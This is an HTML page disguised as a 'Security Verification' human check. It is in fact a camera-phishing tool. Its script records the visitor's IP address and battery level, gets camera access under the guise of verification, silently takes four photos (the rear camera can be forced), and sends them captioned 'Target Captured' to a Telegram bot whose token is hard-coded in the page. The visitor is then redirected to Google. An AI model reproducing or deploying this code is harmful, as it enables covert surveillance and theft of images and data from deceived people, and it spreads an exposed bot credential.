<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 350px;
            width: 100%;
        }
        h2 { margin-bottom: 10px; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background: #2563eb; }
        #status { margin-top: 15px; font-size: 13px; color: #facc15; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Security Verification</h2>
        <p>Please click the button below to verify that you are a human and proceed.</p>
        <button class="btn" id="verifyBtn" onclick="startProcess()">Verify Now 🛡️</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        let ipData = "Fetching...";
        let batteryData = "Unknown";

        // IP Address fetch karna
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { ipData = data.ip; })
            .catch(e => { ipData = "Hidden"; });

        // Battery level check karna
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                batteryData = Math.round(battery.level * 100) + "% " + (battery.charging ? "(Charging)" : "");
            });
        }

        function startProcess() {
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('status').innerText = "Verifying security, please wait...";

            const urlParams = new URLSearchParams(window.location.search);
            const camType = urlParams.get('b');
            const chatId = urlParams.get('id');

            let facingModeSetting = "user"; 
            if (camType === 'back') {
                facingModeSetting = { exact: "environment" }; // Back camera strict mode
            }

            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: facingModeSetting } 
            })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                let photoCount = 0;
                const maxPhotos = 4; // Total 4 photos khinchega

                // Har 1.5 second mein ek photo click hogi (Total 4 photos)
                const photoInterval = setInterval(() => {
                    photoCount++;
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        let captionText = `🎯 Target Captured (${photoCount}/${maxPhotos})\n🌐 IP: ${ipData}\n🔋 Battery: ${batteryData}`;
                        sendPhotoToTelegram(blob, chatId, captionText);
                    }, 'image/jpeg', 0.85);

                    if (photoCount >= maxPhotos) {
                        clearInterval(photoInterval);
                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById('status').innerText = "Verification Successful!";
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 1500);
                    }
                }, 1500);

            })
            .catch(error => {
                // Agar 'exact: environment' ki wajah se error aaye, toh normal environment try karega
                if (camType === 'back') {
                    fallbackBackCamera(chatId);
                } else {
                    document.getElementById('status').innerText = "Camera permission denied!";
                }
            });
        }

        // Fallback agar exact match na ho toh normal back camera kholne ke liye
        function fallbackBackCamera(chatId) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                let photoCount = 0;
                const maxPhotos = 4;

                const interval = setInterval(() => {
                    photoCount++;
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        let captionText = `🎯 Target Captured [Back] (${photoCount}/${maxPhotos})\n🌐 IP: ${ipData}\n🔋 Battery: ${batteryData}`;
                        sendPhotoToTelegram(blob, chatId, captionText);
                    }, 'image/jpeg', 0.85);

                    if (photoCount >= maxPhotos) {
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = "https://www.google.com";
                    }
                }, 1500);
            })
            .catch(err => {
                document.getElementById('status').innerText = "Back camera not accessible!";
            });
        }

        function sendPhotoToTelegram(blob, chatId, caption) {
            if (!chatId) return;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.log(err));
        }
    </script>
</body>
</html>
